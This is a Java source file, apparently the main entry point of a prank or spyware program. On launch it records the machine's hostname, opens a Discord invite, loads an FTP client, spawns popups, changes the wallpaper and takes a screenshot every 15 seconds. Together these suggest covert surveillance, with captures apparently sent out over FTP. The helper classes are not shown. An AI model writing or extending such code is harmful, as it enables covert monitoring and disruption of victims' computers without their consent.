package fr.mimifan.jac;

import fr.mimifan.jac.browser.BrowserManager;
import fr.mimifan.jac.popups.PopupsManager;
import fr.mimifan.jac.resources.ResourcesManager;
import fr.mimifan.jac.screens.ScreenShotter;
import fr.mimifan.jac.ftp.FileTransferClient;
import fr.mimifan.jac.wallpaper.WallpaperManager;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class Main {

    public static String hostname = "";


    public static void main(String[] args) throws UnknownHostException {
        InetAddress localhost = InetAddress.getLocalHost();
        hostname = localhost.getHostName();

        BrowserManager.getInstance().openLink("https://discord.gg/DKnqAAvAwa");

        ResourcesManager.getInstance().loadPopups();
        FileTransferClient.getInstance().load();

        Thread popupsThread = new Thread(PopupsManager::load);
        popupsThread.start();

        Thread wallpaperThread = new Thread(WallpaperManager::changeWallPaper);
        wallpaperThread.start();

        ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
        executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);



    }

}
